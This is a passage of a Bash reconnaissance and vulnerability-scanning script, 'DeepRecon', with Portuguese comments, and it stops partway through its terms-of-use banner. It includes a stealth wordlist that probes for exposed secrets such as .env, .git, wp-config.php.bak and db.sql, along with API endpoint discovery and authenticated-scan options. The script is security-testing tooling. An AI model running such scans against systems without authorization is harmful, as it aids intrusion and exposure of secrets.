#!/bin/bash

# ============================================================
# DeepRecon v1.0 - Varredura completa de vulnerabilidades
# Uso: ./DeepRecon (menu interativo)
# Modos: 1 - Alvo unico | 2 - Multiplos alvos | 3 - Arquivo de alvos
# ============================================================
# AVISO LEGAL:
# Ao usar este scanner, o usuario assume total responsabilidade
# pelo uso das informacoes obtidas. O desenvolvedor NAO se
# responsabiliza por qualquer dano ou uso indevido.
# Use apenas em sistemas que voce tem autorizacao.
# ============================================================

export PATH="$HOME/go/bin:$HOME/.local/bin:$PATH"

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
RESET='\033[0m'
BOLD='\033[1m'

# ── SEGURANÇA: Ctrl+C só mata a ferramenta atual ──
_CANCEL=""
trap '_CANCEL="1"' SIGINT

safe_run() {
  local cmd="$1" label="${2:-comando}" timeout="${3:-120}"
  local pid outfile
  outfile=$(mktemp)
  echo -e "${BLUE}[i] ${label} (timeout: ${timeout}s)${RESET}"
  eval "$cmd" > "$outfile" 2>&1 &
  pid=$!
  local elapsed=0 last_out=0 last_warn=0
  while kill -0 $pid 2>/dev/null; do
    if [ -n "$_CANCEL" ]; then
      echo -e "\n${YELLOW}[!] Cancelado: $label${RESET}"
      kill $pid 2>/dev/null; wait $pid 2>/dev/null
      _CANCEL=""; rm -f "$outfile"; return 1
    fi
    if [ -s "$outfile" ]; then
      local mod=$(stat -c "%Y" "$outfile" 2>/dev/null || echo 0)
      [ "$mod" -gt "$last_out" ] && last_out=$mod
    fi
    if [ "$elapsed" -gt "$last_warn" ] && [ "$elapsed" -ge 20 ] && [ "$((elapsed - last_out))" -gt 15 ]; then
      echo -e "${YELLOW}[!] Sem output ha $((elapsed - last_out))s...${RESET}"
      last_warn=$elapsed
    fi
    if [ "$elapsed" -ge "$timeout" ]; then
      echo -e "${YELLOW}[!] Timeout (${timeout}s) - parando $label${RESET}"
      kill $pid 2>/dev/null; wait $pid 2>/dev/null
      rm -f "$outfile"; return 1
    fi
    sleep 1; elapsed=$((elapsed + 1))
  done
  wait $pid 2>/dev/null; local rc=$?
  cat "$outfile"
  rm -f "$outfile"
  return $rc
}

# ============================================================
# DETECCAO DE HARDWARE
# ============================================================
CPU_CORES=$(nproc 2>/dev/null || echo 1)
TOTAL_RAM=$(free -m 2>/dev/null | awk '/Mem:/{print $2}')
[ -z "$TOTAL_RAM" ] && TOTAL_RAM=1024
FREE_DISK=$(df -m . 2>/dev/null | awk 'NR==2{print $4}')
[ -z "$FREE_DISK" ] && FREE_DISK=1024

# Rate limiting (predefinido, sobrescrito pelo modo)
RATE_LIMIT_MS=300
_LAST_CURL=0
delay_ms() { local ms=$1; sleep $((ms / 1000)).$((ms % 1000)) 2>/dev/null || sleep $((ms / 1000)); }

# Carregar variaveis de ambiente e API keys de .env
SCRIPT_DIR=$(dirname "$(realpath "$0" 2>/dev/null || readlink -f "$0" 2>/dev/null || echo "$0")" 2>/dev/null)
carregar_env() {
  local envs="$SCRIPT_DIR/.env $HOME/.config/deeprecon/.env"
  for envf in $envs; do
    [ -f "$envf" ] && {
      local perm=$(stat -c "%a" "$envf" 2>/dev/null)
      if [ -n "$perm" ] && [ "$perm" != "600" ] && [ "$perm" != "400" ] && [ "$perm" != "440" ]; then
        aviso ".env com permissoes $perm (acessivel a outros usuarios) - ajustando para 600"
        chmod 600 "$envf" 2>/dev/null
      elif [ "$perm" = "600" ] || [ "$perm" = "400" ]; then
        info ".env com permissoes seguras ($perm)"
      fi
      set -a; source "$envf"; set +a; info "API keys carregadas de $envf"; return 0
    }
  done
  [ -f "$SCRIPT_DIR/.env.example" ] && aviso "Crie $SCRIPT_DIR/.env a partir de .env.example para API keys"
  return 0
}

if [ "$CPU_CORES" -le 2 ] || [ "$TOTAL_RAM" -le 1500 ]; then
  HW_NIVEL="BAIXO"; THREADS=5
  HW_COR=$YELLOW
elif [ "$CPU_CORES" -le 4 ] || [ "$TOTAL_RAM" -le 3500 ]; then
  HW_NIVEL="MEDIO"; THREADS=15
  HW_COR=$YELLOW
else
  HW_NIVEL="ALTO"; THREADS=30
  HW_COR=$GREEN
fi

# Teste de qualidade de rede (ping para Google DNS)
NET_LATENCY=$(ping -c 2 -W 2 8.8.8.8 2>/dev/null | tail -1 | grep -oP '/\K[\d.]+' | head -1)
NET_LATENCY=${NET_LATENCY:-999}
if [ "$(echo "$NET_LATENCY > 200" | bc -l 2>/dev/null)" = "1" ] || [ "$NET_LATENCY" = "999" ]; then
  NET_NIVEL="BAIXO"; NET_FATOR=0.3
elif [ "$(echo "$NET_LATENCY > 80" | bc -l 2>/dev/null)" = "1" ]; then
  NET_NIVEL="MEDIO"; NET_FATOR=0.6
else
  NET_NIVEL="ALTO"; NET_FATOR=1.0
fi
THREADS=$(echo "$THREADS * $NET_FATOR" | bc 2>/dev/null | sed 's/\..*//')
[ -z "$THREADS" ] && THREADS=5
[ "$THREADS" -lt 1 ] && THREADS=1

# ============================================================
# FUNCAO LOADING BAR
# ============================================================
loading_bar() {
  local dur=${1:-3}; local msg=${2:-"Inicializando"}; local total=$((dur * 2))
  for i in $(seq 1 $total); do
    pct=$((i * 100 / total))
    filled=$(printf "%${i}s" | tr ' ' '#')
    empty=$(printf "%$((total - i))s")
    printf "\r${CYAN}[${MAGENTA}${filled}${empty}${CYAN}] ${msg}... ${pct}%%${RESET}"
    sleep 0.5
  done
  echo ""
}

# ============================================================
# FUNCOES GLOBAIS
# ============================================================
roda() {
  local tool="$1"; shift
  local rc=0; "$@" || rc=$?
  [ "$rc" -ne 0 ] && echo -e "  ${YELLOW}[!] '$tool' falhou (exit $rc)${RESET}" >&2
  return $rc
}
curl_rapido() {
  local now=$(date +%s); local diff=$((now - _LAST_CURL))
  [ "$RATE_LIMIT_MS" -gt 0 ] 2>/dev/null && { [ "$((RATE_LIMIT_MS / 1000))" -gt "$diff" ] 2>/dev/null && sleep $((RATE_LIMIT_MS / 1000 - diff)); }
  _LAST_CURL=$now
  curl --connect-timeout 5 --max-time 10 -s "$@"
}
html_encode() { sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'\''/\&#39;/g'; }
gerar_html_report() {
  local rt="$1" ho="$2" alvo="$3" dominio="$4" data="$5"
  local tc=$(grep -c "\[CRITICO\]" "$rt" 2>/dev/null||echo 0)
  local ta=$(grep -c "\[ALERTA\]" "$rt" 2>/dev/null||echo 0)
  local total=$((tc+ta))
  local score=$([ "$total" -ge 30 ]&&echo "CRITICO"||[ "$total" -ge 15 ]&&echo "ALTO"||[ "$total" -ge 5 ]&&echo "MEDIO"||echo "BAIXO")
  local cor=$([ "$total" -ge 30 ]&&echo "#dc3545"||[ "$total" -ge 15 ]&&echo "#fd7e14"||[ "$total" -ge 5 ]&&echo "#ffc107"||echo "#28a745")
  local rows="" rowid=0
  while IFS= read -r l; do
    local tipo cor_linha
    if echo "$l"|grep -q "\[CRITICO\]"; then tipo="CRITICO"; cor_linha="#dc3545"
    elif echo "$l"|grep -q "\[ALERTA\]"; then tipo="ALERTA"; cor_linha="#ffc107"
    else continue; fi
    local desc=$(echo "$l"|sed 's/\[CRITICO\] //;s/\[ALERTA\] //'|html_encode)
    local cat="Outros"
    echo "$desc"|grep -qiE "SQL INJECTION|sqlmap|SQLi" && cat="SQL Injection"
    echo "$desc"|grep -qiE "XSS|cross.site" && cat="Cross-Site Scripting"
    echo "$desc"|grep -qiE "WAF|firewall" && cat="WAF / Firewall"
    echo "$desc"|grep -qiE "backup|wp.config|BAK|.sql|dump" && cat="Backup / Vazamento"
    echo "$desc"|grep -qiE "ACESSO LIVRE|DIRETORIO|path|traversal" && cat="Diretorio Exposto"
    echo "$desc"|grep -qiE "git|.env|config|PHPINFO" && cat="Configuracao Exposta"
    echo "$desc"|grep -qiE "PUT|upload|webshell|shell" && cat="Upload / Webshell"
    echo "$desc"|grep -qiE "PORTA ABERTA|SERVICO ENCONTRADO|porta" && cat="Porta / Servico"
    echo "$desc"|grep -qiE "METASPLOIT|cve|CVE" && cat="Exploit / CVE"
    echo "$desc"|grep -qiE "SSL|certificado|heartbleed|poodle" && cat="SSL/TLS"
    echo "$desc"|grep -qiE "header|HSTS|CSP|X-Frame|XSS.Protection" && cat="Header de Seguranca"
    echo "$desc"|grep -qiE "cookie|session" && cat="Cookie / Sessao"
    echo "$desc"|grep -qiE "Default Credential|password|login|admin" && cat="Credenciais / Acesso"
    rows+="<tr class=\"sev_$tipo\" data-cat=\"$cat\"><td><span class=\"badge $tipo\">$tipo</span></td><td>$desc</td><td>$cat</td></tr>"
    rowid=$((rowid+1))
  done < <(grep -E "\[CRITICO\]|\[ALERTA\]" "$rt" 2>/dev/null)
  html_tmp=$(mktemp)
  cat > "$html_tmp" << 'HTMLEND'
<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DeepRecon - __DOMINIO__</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0a0e17;color:#e0e0e0;padding:20px}
h1{color:#00d4ff;font-size:1.8em;margin-bottom:20px}
h2{color:#8892b0;font-size:1.2em;margin-bottom:10px}
.card{background:#12162a;border:1px solid #1e2745;border-radius:10px;padding:20px;margin:10px 0}
.card h2{border-bottom:1px solid #1e2745;padding-bottom:8px;margin-bottom:12px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px}
.stat{text-align:center;padding:10px;border-radius:8px;background:#0d1117}
.stat .num{font-size:2em;font-weight:bold}
.stat .lbl{font-size:.8em;color:#8892b0;margin-top:4px}
.stat.crit .num{color:#dc3545}
.stat.alert .num{color:#ffc107}
.stat.total .num{color:#00d4ff}
.bar{background:#0d1117;border-radius:8px;height:28px;overflow:hidden;margin:10px 0}
.bar-fill{height:100%;text-align:center;line-height:28px;color:#fff;font-weight:bold;transition:width .5s}
table{width:100%;border-collapse:collapse;font-size:.9em}
th{text-align:left;color:#8892b0;border-bottom:2px solid #1e2745;padding:10px 8px;cursor:pointer}
th:hover{color:#00d4ff}
td{border-bottom:1px solid #1a1f33;padding:8px;vertical-align:top}
tr:hover{background:#1a1f33}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.8em;font-weight:bold}
.badge.CRITICO{background:#dc354522;color:#dc3545;border:1px solid #dc3545}
.badge.ALERTA{background:#ffc10722;color:#ffc107;border:1px solid #ffc107}
.filtro{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
.filtro button{padding:6px 14px;border:1px solid #1e2745;border-radius:6px;background:#0d1117;color:#e0e0e0;cursor:pointer;font-size:.85em}
.filtro button:hover,.filtro button.ativo{border-color:#00d4ff;color:#00d4ff}
.busca input{width:100%;padding:10px;border:1px solid #1e2745;border-radius:6px;background:#0d1117;color:#e0e0e0;font-size:.9em;margin-bottom:10px}
.busca input:focus{outline:none;border-color:#00d4ff}
footer{text-align:center;color:#555;font-size:.8em;margin-top:30px;padding:20px}
</style></head><body>
<h1>&#x1F50D; DeepRecon - Relatorio de Seguranca</h1>
<div class="card">
  <div class="grid">
    <div class="stat"><div class="num">__ALVO__</div><div class="lbl">Alvo</div></div>
    <div class="stat"><div class="num">__DOMINIO__</div><div class="lbl">Dominio</div></div>
    <div class="stat"><div class="num">__DATA__</div><div class="lbl">Data</div></div>
    <div class="stat"><div class="num" style="color:__COR__">__SCORE__</div><div class="lbl">Score</div></div>
  </div>
</div>
<div class="card">
  <h2>&#x1F4CA; Resumo</h2>
  <div class="grid">
    <div class="stat crit"><div class="num">__TC__</div><div class="lbl">Criticos</div></div>
    <div class="stat alert"><div class="num">__TA__</div><div class="lbl">Alertas</div></div>
    <div class="stat total"><div class="num">__TOTAL__</div><div class="lbl">Total Achados</div></div>
  </div>
  <div class="bar"><div class="bar-fill" style="width:__BARRA__%;background:__COR__">__BARRA__%</div></div>
</div>
<div class="card">
  <h2>&#x1F4CB; Achados</h2>
  <div class="filtro" id="filtros">
    <button class="ativo" data-filtro="all">Todos</button>
    <button data-filtro="CRITICO">Criticos</button>
    <button data-filtro="ALERTA">Alertas</button>
    <button data-filtro="cat">SQL Injection</button>
    <button data-filtro="cat">XSS</button>
    <button data-filtro="cat">Diretorio Exposto</button>
    <button data-filtro="cat">Configuracao</button>
    <button data-filtro="cat">Upload</button>
    <button data-filtro="cat">SSL/TLS</button>
  </div>
  <div class="busca"><input type="text" id="busca" placeholder="Pesquisar achados..."></div>
  <table id="tabela-achados">
    <thead><tr><th onclick="ordena(0)">Severidade</th><th onclick="ordena(1)">Descricao</th><th onclick="ordena(2)">Categoria</th></tr></thead>
    <tbody>__ROWS__</tbody>
  </table>
</div>
<script>
const filtros=document.querySelectorAll('#filtros button');
const busca=document.getElementById('busca');
const linhas=document.querySelectorAll('#tabela-achados tbody tr');
filtros.forEach(b=>b.addEventListener('click',()=>{
  filtros.forEach(x=>x.classList.remove('ativo'));
  b.classList.add('ativo');const f=b.dataset.filtro;
  linhas.forEach(l=>{
    const sev=l.classList.contains('sev_CRITICO')?'CRITICO':l.classList.contains('sev_ALERTA')?'ALERTA':'';
    const cat=l.dataset.cat||'';
    if(f=='all')l.style.display='';
    else if(f=='CRITICO'||f=='ALERTA')l.style.display=sev==f?'':'none';
    else l.style.display=cat==f?'':'none';
  });
}));
busca.addEventListener('input',()=>{
  const q=busca.value.toLowerCase();
  linhas.forEach(l=>l.style.display=l.textContent.toLowerCase().includes(q)?'':'none');
});
function ordena(n){const t=document.getElementById('tabela-achados');const b=Array.from(t.rows).slice(1);b.sort((a,b)=>a.cells[n].textContent.localeCompare(b.cells[n].textContent));b.forEach(r=>t.tBodies[0].appendChild(r));}
</script>
<footer>Gerado por DeepRecon v__VERSAO__ em __DATA__</footer>
</body></html>
HTMLEND
  local barra=$((total>50?100:total*2))
  cp "$html_tmp" "$ho"
  sed -i "s|__ALVO__|$alvo|g; s|__DOMINIO__|$dominio|g; s|__DATA__|$data|g; s|__COR__|$cor|g; s|__SCORE__|$score|g; s|__TC__|$tc|g; s|__TA__|$ta|g; s|__TOTAL__|$total|g; s|__BARRA__|$barra|g; s|__ROWS__|$rows|g; s|__VERSAO__|$VERSAO_SCR|g" "$ho"
  rm -f "$html_tmp"
  echo -e "  ${GREEN}[HTML] ${CYAN}$ho${RESET}"
}

# ============================================================
# FUNCOES DE RESILIENCIA E OTIMIZACAO
# ============================================================
# Fix 1/5: Valida ferramenta e testa conectividade
valida_ferramenta() {
  local cmd="$1"
  command -v "$cmd" &>/dev/null || { aviso "$cmd nao encontrado no sistema"; return 1; }
  timeout 5 "$cmd" --version 2>/dev/null | head -1 &>/dev/null || timeout 5 "$cmd" -h 2>/dev/null | head -1 &>/dev/null || true
  return 0
}

verificar_conexao() {
  local alvo="$1" dominio="${2:-$alvo}"
  local code=$(curl_rapido -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 "$alvo" 2>/dev/null)
  if [ -z "$code" ] || [ "$code" = "000" ]; then
    aviso "Alvo $alvo inalcancavel - pulando scans intensivos"
    return 1
  fi
  return 0
}

tentar() {
  local max=${MAX_TENTATIVAS:-2} n=0 nome="$1"
  shift
  until timeout 60 "$@" 2>/dev/null; do
    n=$((n+1))
    [ "$n" -ge "$max" ] && { aviso "$nome falhou apos $max tentativas"; return 1; }
    info "Tentativa $n/$max para $nome"
    sleep $((n*3))
  done
  return 0
}

# Fix 3: Controle de jobs paralelos
MAX_JOBS=$(( CPU_CORES * 2 ))
[ "$MAX_JOBS" -lt 2 ] && MAX_JOBS=2
[ "$MAX_JOBS" -gt 20 ] && MAX_JOBS=20
JOB_PIDS=()

job_lanca() {
  local nome="$1"; shift
  job_espera
  ("$@" 2>/dev/null || aviso "$nome falhou") &
  JOB_PIDS+=($!)
}

job_espera() {
  while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
    wait -n 2>/dev/null
  done
}

job_aguarda_todos() {
  for pid in "${JOB_PIDS[@]}"; do
    wait "$pid" 2>/dev/null
  done
  JOB_PIDS=()
}

# Fix 2: Limpeza de arquivos temporarios
MAX_OUTPUT_BYTES=51200
limpar_temporarios() {
  rm -f /tmp/.deeprecon_* 2>/dev/null
  find /tmp -name "DeepRecon_*" -mtime +1 -delete 2>/dev/null
  local rdir="$SCRIPT_DIR/reports"
  [ -d "$rdir" ] && {
    find "$rdir" -name "*.txt" -mtime +7 -delete 2>/dev/null
    find "$rdir" -name "*.json" -mtime +7 -delete 2>/dev/null
    find "$rdir" -name "*.html" -mtime +7 -delete 2>/dev/null
    find "$rdir" -type d -empty -mtime +1 -delete 2>/dev/null
  }
}

# Fix 6: Validacao de escopo
SCOPE_DOMAIN=""
SCOPE_ALVOS=()

escopo_adicionar() {
  local sub="$1"
  [ -z "$SCOPE_DOMAIN" ] && return 0
  if echo "$sub" | grep -qiE "(amazonaws|cloudfront|zendesk|freshdesk|salesforce|shopify|wix|squarespace)"; then
    aviso "FORA DE ESCOPO: $sub parece servico de terceiro"
    return 1
  fi
  if [[ "$sub" == *".$SCOPE_DOMAIN" ]] || [[ "$sub" == "$SCOPE_DOMAIN" ]]; then
    SCOPE_ALVOS+=("$sub")
    return 0
  fi
  aviso "FORA DE ESCOPO: $sub nao pertence a *.$SCOPE_DOMAIN"
  return 1
}

# Fix 4: Deteccao de SPA (React/Angular/Vue)
TEC_SPA=0 TEC_REACT=0 TEC_ANGULAR=0 TEC_VUE=0 TEC_API=0
detectar_spa() {
  local body=$(curl_rapido --max-time 5 "$ALVO" 2>/dev/null)
  echo "$body" | grep -qi "react-app\|__NEXT_DATA__\|react-dom\|createRoot" && TEC_REACT=1 && TEC_SPA=1
  echo "$body" | grep -qi "ng-app\|ng-version\|angular" && TEC_ANGULAR=1 && TEC_SPA=1
  echo "$body" | grep -qi "vue-app\|__VUE__\|vuex\|nuxt" && TEC_VUE=1 && TEC_SPA=1
  if [ "$TEC_SPA" = "1" ]; then
    info "SPA detectado ($([ $TEC_REACT = 1 ] && echo 'React' || [ $TEC_ANGULAR = 1 ] && echo 'Angular' || echo 'Vue')) - testando endpoints API"
    for api_path in api graphql rest swagger openapi.json v1 v2 api/v1 api/v2 api/graphql; do
      api_code=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/$api_path" 2>/dev/null)
      [ "$api_code" != "000" ] && [ "$api_code" != "404" ] && TEC_API=1 && info "  API endpoint: /$api_path (HTTP $api_code)"
    done
  fi
}

# Wordlist mini (~50 paths) para modo furtivo
mini_wordlist() {
  local wl="/tmp/.deeprecon_mini_wordlist.txt"
  [ -f "$wl" ] && { echo "$wl"; return; }
  cat > "$wl" << 'WLEOF'
admin
login
dashboard
wp-admin
wp-login.php
administrator
api
v1
v2
api/v1
api/v2
graphql
rest
swagger
openapi.json
.git
.env
.htaccess
config
backup
db.sql
dump.sql
phpinfo.php
info.php
robots.txt
sitemap.xml
crossdomain.xml
xmlrpc.php
wp-config.php.bak
server-status
server-info
cgi-bin
phpMyAdmin
adminer.php
uploads
images
assets
static
css
js
index.php
index.html
test.php
debug.php
private
secret
hidden
painel
console
manager
WLEOF
  echo "$wl"
}


# ============================================================
# ISSUE 1: DETECCAO DE CONFLITOS DE VERSAO
# ============================================================
VERSAO_SCR="1.0.0"
VERSAO_GIT=""
URL_GIT="https://api.github.com/repos/derambrplays/DeepRecon/releases/latest"

verificar_versoes() {
  local pyver=$(python3 --version 2>/dev/null | grep -oP '\d+\.\d+')
  local gover=$(go version 2>/dev/null | grep -oP '\d+\.\d+')
  local nmapver=$(nmap --version 2>/dev/null | grep -oP '\d+\.\d+' | head -1)
  local rubyver=$(ruby --version 2>/dev/null | grep -oP '\d+\.\d+')
  local ok=0
  [ -z "$pyver" ] && aviso "Python 3 nao encontrado - SQLMap/Commix podem falhar" && ok=1
  [ -n "$pyver" ] && {
    local pymajor=${pyver%%.*}
    [ "$pymajor" -lt 3 ] && aviso "Python $pyver detectado - SQLMap exige Python 3" && ok=1
  }
  [ -z "$gover" ] && aviso "Go nao encontrado - Subfinder/Amass podem falhar" && ok=1
  [ -z "$nmapver" ] && aviso "Nmap nao encontrado - scans de porta serao via TCP/bash" && ok=1
  [ -n "$nmapver" ] && {
    local nmapmajor=${nmapver%%.*}
    [ "$nmapmajor" -lt 7 ] && aviso "Nmap $nmapver antigo - atualize via 'sudo apt install nmap' para melhores resultados" && ok=1
  }
  [ -z "$rubyver" ] && aviso "Ruby nao encontrado - Metasploit pode falhar" 
  [ "$ok" -eq 0 ] && info "Todas as versoes de runtime sao compativeis"
  return "$ok"
}

# ============================================================
# ISSUE 4: AUTO-UPDATE
# ============================================================
verificar_atualizacao() {
  [ -z "$VERSAO_SCR" ] && VERSAO_SCR="1.0.0"
  [ -z "$URL_GIT" ] && URL_GIT="https://api.github.com/repos/derambrplays/DeepRecon/releases/latest"

  echo ""
  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
  echo -e "${CYAN}${BOLD}║        VERIFICANDO ATUALIZACOES...              ║${RESET}"
  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
  echo ""

  local spin=('—' '\' '/' '|') i=0
  local tmp_out; tmp_out=$(mktemp)
  (curl_rapido "$URL_GIT" 2>/dev/null | grep '"tag_name"' | head -1 | grep -oP 'v?\d+\.\d+\.\d+' > "$tmp_out") &
  local pid=$!
  while kill -0 $pid 2>/dev/null; do
    printf "\r${CYAN}   %s${RESET} Checando versao remota..." "${spin[i]}"
    i=$(( (i+1) % 4 ))
    sleep 0.3
  done
  wait $pid 2>/dev/null; printf "\r${GREEN}   \xE2\x9C\x93${RESET} Checando versao remota...\n"

  local VERSAO_GIT
  VERSAO_GIT=$(cat "$tmp_out" 2>/dev/null); rm -f "$tmp_out"

  [ -z "$VERSAO_GIT" ] && {
    echo -e "  ${YELLOW}[!] Offline / sem resposta${RESET}"
    echo -e "  ${BLUE}[i] DeepRecon $VERSAO_SCR (modo local)${RESET}\n"
    return 0
  }

  if [ "$VERSAO_GIT" != "$VERSAO_SCR" ]; then
    echo ""
    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
    echo -e "${YELLOW}${BOLD}║        NOVA VERSAO DISPONIVEL!                  ║${RESET}"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
    echo -e "${YELLOW}${BOLD}║${RESET}  Remota:  ${CYAN}$VERSAO_GIT${RESET}"
    echo -e "${YELLOW}${BOLD}║${RESET}  Atual:   ${RED}$VERSAO_SCR${RESET}"
    echo -e "${YELLOW}${BOLD}║${RESET}"
    echo -e "${YELLOW}${BOLD}║${RESET}  ${YELLOW}Atualizar agora? (S/n)${RESET}"
    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
    echo -ne "  > "; read -r resp
    [[ "$resp" != "n" && "$resp" != "N" ]] && {
      echo -e "\n${CYAN}[i] Atualizando...${RESET}"
      git pull origin main 2>/dev/null || git pull origin master 2>/dev/null
      local pull_ok=$?
      if [ "$pull_ok" -eq 0 ]; then
        echo -e "${GREEN}[+] Atualizado com sucesso! Execute o script novamente.${RESET}\n"
        exit 0
      else
        echo -e "${RED}[!] Falha ao atualizar. Execute: git pull${RESET}\n"
      fi
    }
  else
    echo -e "  ${GREEN}[\xE2\x9C\x93] DeepRecon $VERSAO_SCR atualizado${RESET}\n"
  fi
}

# ============================================================
# ISSUE 2: MODO SEGURO (ANTI-POLUICAO)
# ============================================================
MODO_SEGURO=0
detectar_forms_agressivos() {
  local alvo="$1"
  local forms=$(curl_rapido "$alvo" 2>/dev/null | grep -ciE '<form|<input.*type=.(text|email|password)|<textarea|<select')
  local inputs=$(curl_rapido "$alvo" 2>/dev/null | grep -ciE '<input|<select|<textarea')
  [ "$forms" -gt 3 ] || [ "$inputs" -gt 20 ] || return 0
  echo -e "${YELLOW}╔══════════════════════════════════════════════════╗${RESET}"
  echo -e "${YELLOW}║  AVISO: Muitos formularios detectados!          ║${RESET}"
  echo -e "${YELLOW}║  $forms formularios, $inputs campos              ║${RESET}"
  echo -e "${YELLOW}║  Testes agressivos podem POLUIR o banco de     ║${RESET}"
  echo -e "${YELLOW}║  dados do alvo com cadastros falsos.            ║${RESET}"
  echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${RESET}"
  echo -e "${YELLOW}║  [1] Modo SEGURO - pula testes de formulario    ║${RESET}"
  echo -e "${YELLOW}║  [2] Ignorar e continuar (risco de poluicao)    ║${RESET}"
  echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${RESET}"
  printf "${YELLOW}Escolha (1/2): ${RESET}"; read -r safe_resp
  [ "$safe_resp" = "1" ] && MODO_SEGURO=1
}

# ============================================================
# ISSUE 3: AUTENTICACAO
# ============================================================
AUTH_COOKIE=""
AUTH_CRED=""
AUTH_LOGIN_URL=""
AUTH_LOGIN_BODY=""

configurar_auth() {
  echo -e "${CYAN}╔══════════════════════════════════════════════════╗${RESET}"
  echo -e "${CYAN}║       CONFIGURACAO DE AUTENTICACAO              ║${RESET}"
  echo -e "${CYAN}╠══════════════════════════════════════════════════╣${RESET}"
  echo -e "${CYAN}║${RESET}  [0] Nenhuma (scan anonimo)"
  echo -e "${CYAN}║${RESET}  [1] Cookie de sessao"
  echo -e "${CYAN}║${RESET}  [2] Basic Auth (user:pass)"
  echo -e "${CYAN}║${RESET}  [3] Login via formulario"
  echo -e "${CYAN}╚══════════════════════════════════════════════════╝${RESET}"
  printf "${YELLOW}Escolha (0-3): ${RESET}"; read -r auth_tipo
  case "$auth_tipo" in
    1) printf "Cookie (ex: PHPSESSID=abc123): "; read -r AUTH_COOKIE ;;
    2) printf "Credencial (user:pass): "; read -r AUTH_CRED ;;
    3) printf "URL de login: "; read -r AUTH_LOGIN_URL
       printf "Body POST (ex: user=admin&pass=admin): "; read -r AUTH_LOGIN_BODY ;;
    *) AUTH_COOKIE=""; AUTH_CRED=""; AUTH_LOGIN_URL=""; AUTH_LOGIN_BODY="" ;;
  esac
}

curl_auth() {
  local args=()
  [ -n "$AUTH_COOKIE" ] && args+=(-b "$AUTH_COOKIE")
  [ -n "$AUTH_CRED" ] && args+=(-u "$AUTH_CRED")
  [ -n "$AUTH_LOGIN_URL" ] && {
    local cookiejar="/tmp/.deeprecon_auth_$$.jar"
    curl -s -c "$cookiejar" -d "$AUTH_LOGIN_BODY" "$AUTH_LOGIN_URL" >/dev/null 2>&1 && args+=(-b "$cookiejar")
  }
  curl_rapido "${args[@]}" "$@"
}

login_automatico() {
  [ -z "$AUTH_LOGIN_URL" ] && [ -z "$AUTH_COOKIE" ] && [ -z "$AUTH_CRED" ] && return 0
  info "Modo autenticado ativo${AUTH_COOKIE:+ (cookie)}${AUTH_CRED:+ (basic)}${AUTH_LOGIN_URL:+ (form)}"
}

detectar_nuvem() {
  local ip="$1" headers="$2"
  echo "$headers" | grep -qiE "cf-ray|__cfduid|cf-cache-status|x-amz-cf-id|x-amz-request-id|x-robots-tag.*cloudflare|server.*cloudflare|server.*akamai|server.*incapsula|x-guploader" && {
    echo -e "  ${RED}╔══════════════════════════════════════════════════╗${RESET}"
    echo -e "  ${RED}║${RESET}  ${BOLD}ALERTA: NUVEM DETECTADA!${RESET}                    ${RED}║${RESET}"
    echo -e "  ${RED}║${RESET}  O alvo pode estar atras de CDN/proxy de nuvem.  ${RED}║${RESET}"
    echo -e "  ${RED}║${RESET}  ${YELLOW}EDoS RISK:${RESET} O volume de requisicoes pode       ${RED}║${RESET}"
    echo -e "  ${RED}║${RESET}  esgotar recursos da nuvem e gerar ${BOLD}cobrancas${RESET}      ${RED}║${RESET}"
    echo -e "  ${RED}║${RESET}  financeiras para o proprietario do site.        ${RED}║${RESET}"
    echo -e "  ${RED}║${RESET}                                               ${RED}║${RESET}"
    if [ "$MODO" = "bruto" ]; then
      echo -e "  ${RED}║${RESET}  ${YELLOW}Recomenda-se usar MODO MEDIO ou CUSTOM com        ${RED}║${RESET}"
      echo -e "  ${RED}║${RESET}  taxa reduzida. Deseja continuar? (s/N)         ${RED}║${RESET}"
      echo -e "  ${RED}╚══════════════════════════════════════════════════╝${RESET}"
      printf "${YELLOW}Continuar mesmo assim? (s/N): ${RESET}"; read -r cloud_ok
      [[ "$cloud_ok" != "s" && "$cloud_ok" != "S" ]] && { aviso "Scan abortado pelo aviso de nuvem"; exit 1; }
      aviso "Continuando em modo bruto contra nuvem (risco EDoS assumido)"
    else
      echo -e "  ${RED}╚══════════════════════════════════════════════════╝${RESET}"
    fi
    return 0
  }
  return 0
}

# ============================================================
# BANNER
# ============================================================
clear
echo -e "${MAGENTA}${BOLD}"
echo "   ____                     ____                     "
echo "  / __ \___  ___  ____     / __ \___  _________  ____"
echo " / / / / _ \/ _ \/ __ \   / /_/ / _ \/ ___/ __ \/ __ \\"
echo "/ /_/ /  __/  __/ /_/ /  / _, _/  __/ /__/ /_/ / / / /"
echo "\_____/\___/\___/ .___/  /_/ |_|\___/\___/\____/_/ /_/"
echo "               /_/                                     "
echo -e "${RESET}"
echo ""

# ============================================================
# TERMOS DE USO
# ============================================================
echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${YELLOW}${BOLD}║              TERMOS DE USO - DeepRecon            ║${RESET}"
echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  Ao utilizar o DeepRecon, voce concorda que:"
echo -e "${YELLOW}${BOLD}║${RESET}"
